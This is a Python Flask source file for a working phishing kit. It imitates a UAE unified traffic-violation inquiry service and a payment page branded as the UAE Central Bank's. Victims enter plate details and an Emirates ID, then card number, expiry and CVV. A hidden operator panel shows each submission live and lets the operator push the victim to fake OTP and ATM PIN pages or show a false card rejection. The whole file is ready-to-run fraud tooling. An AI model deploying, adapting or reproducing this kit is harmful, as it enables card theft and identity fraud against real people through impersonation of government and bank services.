import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات التحكم والبيانات (Live Control)
db = {
    "logs": [],
    "status": "waiting", # waiting, go_otp, error_card, go_pin, error_otp
    "current_id": 0
}

# --- 1. الصفحة الرئيسية (الصور الكاملة والزراير المظبوطة) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html { margin:0; padding:0; width:100%; background:#fff; overflow-x:hidden; }
    .page-container { position:relative; max-width:650px; margin:0 auto; box-shadow:0 0 20px rgba(0,0,0,0.1); }
    .header-fixed { position:sticky; top:0; z-index:1000; background:white; width:100%; }
    img { width:100%; display:block; }
    .action-btn { position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; z-index:10; }
</style>
</head>
<body>
    <div class="page-container">
        <div class="header-fixed"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg"></div>
        <div style="position:relative;">
            <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
            <button class="action-btn" style="top:275px;" onclick="location.href='/search'"></button>
            <button class="action-btn" style="top:325px;" onclick="location.href='/search'"></button>
            
            <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
        </div>
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (الجامبو والخيارات الكاملة) ---
SEARCH_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background:#f4f4f4; font-family:sans-serif; margin:0; }
    .mega-card { background:white; width:95%; max-width:850px; margin:30px auto; border-radius:15px; box-shadow:0 15px 50px rgba(0,0,0,0.1); border-top:10px solid #b0914f; overflow:hidden; }
    .card-head { background:#b0914f; color:white; padding:30px; text-align:center; font-size:24px; font-weight:bold; }
    .form-body { padding:40px; }
    label { display:block; margin-bottom:12px; font-weight:bold; font-size:18px; color:#333; }
    select, input { width:100%; padding:18px; margin-bottom:25px; border:2px solid #ddd; border-radius:10px; font-size:17px; }
    .plate-grid { display:grid; grid-template-columns: 1.5fr 1fr 2fr; gap:15px; }
    .btn-search { background:#b0914f; color:white; border:none; padding:22px; width:100%; border-radius:10px; font-size:22px; font-weight:bold; cursor:pointer; }
</style></head>
<body>
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%;">
    <div class="mega-card">
        <div class="card-head">نظام الاستعلام عن المخالفات المرورية الموحد</div>
        <form action="/report" method="POST" class="form-body">
            <label>إمارة مصدر اللوحة / Plate Source:</label>
            <select name="emirate">
                <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
            </select>
            <label>فئة ورمز اللوحة / Plate Details:</label>
            <div class="plate-grid">
                <select name="cat">
                    <option>خصوصي / Private</option><option>نقل عام / Public</option><option>تجاري / Commercial</option>
                    <option>دراجة / Cycle</option><option>تصدير / Export</option><option>تحت التجربة</option>
                </select>
                <input type="text" name="code" placeholder="الرمز">
                <input type="text" name="number" placeholder="رقم اللوحة">
            </div>
            <label>رقم الهوية الإماراتية / Emirates ID:</label>
            <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>
            <button type="submit" class="btn-search">بدء عملية البحث</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. صفحة التقرير والدفع الاحترافي ---
PAY_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background:#f9f9f9; font-family:sans-serif; }
    .pay-container { max-width:600px; margin:20px auto; background:white; border-radius:20px; box-shadow:0 20px 50px rgba(0,0,0,0.15); border:1px solid #b0914f; overflow:hidden; }
    .pay-header { background:#b0914f; color:white; padding:30px; text-align:center; }
    .pay-content { padding:35px; }
    .bank-logos { display:flex; justify-content:center; gap:20px; margin-bottom:30px; }
    .bank-logos img { height:40px; }
    .input-row { position:relative; }
    input { width:100%; padding:18px; margin-bottom:20px; border:1px solid #ddd; border-radius:12px; font-size:18px; box-sizing:border-box; }
    .card-logo { position:absolute; left:15px; top:18px; height:30px; display:none; }
    .btn-gold { background:linear-gradient(#b0914f, #8e753f); color:white; width:100%; padding:22px; border:none; border-radius:12px; font-size:22px; font-weight:bold; cursor:pointer; }
</style></head>
<body>
    <div class="pay-container">
        <div class="pay-header"><h3>بوابة الدفع الإلكتروني - مصرف الإمارات المركزي</h3></div>
        <div class="pay-content">
            <div class="bank-logos">
                <img src="https://img.icons8.com/color/96/visa.png">
                <img src="https://img.icons8.com/color/96/mastercard.png">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png">
            </div>
            <form action="/submit-card" method="POST">
                <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
                <div class="input-row">
                    <input type="text" id="cn" name="card" placeholder="رقم البطاقة (16 رقم)" maxlength="19" required>
                    <img id="logo" class="card-logo" src="">
                </div>
                <div style="display:flex; gap:10px;">
                    <input type="text" name="exp" placeholder="MM/YY" maxlength="5">
                    <input type="text" name="cvv" placeholder="CVV" maxlength="3">
                </div>
                <button type="submit" class="btn-gold">إتمام السداد الآمن</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('cn').addEventListener('input', e => {
            let v = e.target.value.replace(/\\s/g, '');
            let img = document.getElementById('logo');
            if(v.startsWith('4')) { img.src='https://img.icons8.com/color/48/visa.png'; img.style.display='block'; }
            else if(v.startsWith('5')) { img.src='https://img.icons8.com/color/48/mastercard.png'; img.style.display='block'; }
            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
        });
    </script>
</body>
</html>
"""

# --- 4. لوحة التحكم الحية (التي لا تخطئ) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><style>
    body { background:#111; color:white; font-family:sans-serif; padding:20px; }
    .log-box { background:#222; border:2px solid gold; padding:20px; border-radius:12px; margin-bottom:15px; }
    button { padding:12px 25px; margin:5px; font-weight:bold; cursor:pointer; border-radius:5px; border:none; }
    .btn-green { background:green; color:white; }
    .btn-red { background:red; color:white; }
</style></head>
<body>
    <h1>لوحة تحكم حسن 🚀</h1>
    <div id="display"></div>
    <script>
        function load() {
            fetch('/get-logs').then(r => r.json()).then(data => {
                let h = '';
                data.logs.forEach(log => {
                    h += `<div class="log-box"><p>${JSON.stringify(log)}</p>
                    <button class="btn-green" onclick="act('go_otp')">اطلب OTP</button>
                    <button class="btn-red" onclick="act('error_card')">رفض البطاقة</button>
                    <button class="btn-green" onclick="act('go_pin')">اطلب PIN</button></div>`;
                });
                document.getElementById('display').innerHTML = h;
            });
        }
        function act(s) { fetch('/set-status/' + s); }
        setInterval(load, 3000);
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/report', methods=['POST'])
def report():
    return render_template_string("<body style='text-align:center; padding:50px;'><h1>جاري الاتصال بقاعدة بيانات الوزارة...</h1><script>setTimeout(()=>location.href='/checkout', 2000)</script></body>")

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/submit-card', methods=['POST'])
def sub_card():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['logs']})

@app.route('/set-status/<s>')
def set_status(s):
    db['status'] = s
    return "OK"

@app.route('/check-status')
def check_status(): return jsonify({"status": db['status']})

WAIT_JS = """
<script>
    setInterval(() => {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'go_otp') location.href='/otp-page';
            if(d.status === 'go_pin') location.href='/pin-page';
            if(d.status === 'error_card') { alert('عذراً، البطاقة مرفوضة من المصرف'); location.href='/checkout'; }
        });
    }, 3000);
</script>
<body style="text-align:center; padding-top:100px; font-family:sans-serif; background:#f4f4f4;">
    <div style="border:8px solid #ddd; border-top:8px solid #b0914f; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:auto;"></div>
    <h2>جاري الاتصال بالمصرف... يرجى الانتظار</h2>
    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
</body>
"""

@app.route('/otp-page')
def otp(): return "<body><div style='max-width:400px; margin:50px auto; text-align:center;'><h2>رمز التحقق (OTP)</h2><p>أدخل الرمز المرسل لهاتفك</p><form action='/submit-card' method='POST'><input name='otp' style='width:100%; padding:15px; font-size:20px;'><button style='width:100%; padding:15px; background:#b0914f; color:white; border:none; margin-top:10px;'>تأكيد</button></form></div></body>"

@app.route('/pin-page')
def pin(): return "<body><div style='max-width:400px; margin:50px auto; text-align:center;'><h2>الرمز السري (ATM PIN)</h2><form action='/submit-card' method='POST'><input type='password' name='pin' style='width:100%; padding:15px; font-size:20px;'><button style='width:100%; padding:15px; background:#b0914f; color:white; border:none; margin-top:10px;'>تأكيد</button></form></div></body>"

@app.route('/h-admin')
def admin_portal(): return render_template_string(ADMIN_HTML)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
